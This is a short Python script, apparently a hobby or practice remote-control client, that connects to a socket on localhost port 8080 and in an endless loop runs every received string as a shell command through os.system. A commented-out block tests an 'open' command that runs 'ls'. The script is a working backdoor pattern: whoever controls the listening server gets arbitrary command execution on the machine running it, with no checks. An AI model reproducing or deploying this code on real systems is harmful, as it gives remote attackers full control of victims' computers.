import time
import socket
import sys
import os

s = socket.socket()

host = "127.0.0.1"

port = 8080

s.connect((host, port))

print("connected to Server..")

while True:
    command = s.recv(1024)

    command = command.decode()

    os.system(command)

# if command == "open":
#     print("Command is :", command)
#     s.send("command received".encode())
#     os.system("ls")